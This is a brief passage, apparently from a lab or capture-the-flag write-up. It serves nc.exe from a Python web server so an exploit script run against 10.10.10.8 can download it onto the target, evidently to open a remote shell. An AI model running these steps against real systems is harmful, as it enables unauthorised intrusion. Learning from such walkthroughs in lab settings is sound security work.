It says we need to have a web server hosting nc.exe so lets start a python server before running the exploit.Dont forget to edit the IP and the port.

We copy nc.exe to our current directory and start a python webserver:

```s

python3 -m http.server 80
python exploit.py 10.10.10.8 80
```
